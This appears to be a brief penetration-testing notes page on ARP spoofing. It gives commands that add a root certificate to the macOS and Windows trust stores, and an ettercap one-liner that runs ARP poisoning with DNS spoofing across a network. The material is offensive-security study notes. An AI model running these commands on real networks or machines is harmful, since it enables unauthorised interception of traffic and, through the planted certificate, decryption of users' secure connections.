# 03 - ARP Spoofing

Search Tag(s): #initial-access #exploitation #sniffing-and-spoofing #ettercap

TODO: Re-arrange this section under persistence (https://www.ired.team/offensive-security/persistence/t1130-install-root-certificate)


Mac OSX

```
$ add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename
```

Windows

```
C:\> CertUtil.exe -addstore -f -user "Root" "C:\path\to\cert.pem"
```

```
PS C:\> Import-Certificate -FilePath C:\Users\spot\Downloads\certnew.cer -CertStoreLocation Cert:\CurrentUser\Root\

HKEY_CURRENT_USER\Software\Microsoft\SystemCertificates\Root\Certificates\
```

Sniff the network

```
$ sudo ettercap -Tqi <interface> -P dns_spoof -M arp // //
```

---
## References

- [Hacking Articles: Comprehensive Guide on Sniffing](https://www.hackingarticles.in/comprehensive-guide-on-sniffing/)

- [Joakim Uddholm: Ettercap, Arpspoof and DNSSpoof Examples](https://joakim.uddholm.com/posts/ettercap-arpspoof-and-dnsspoof-examples)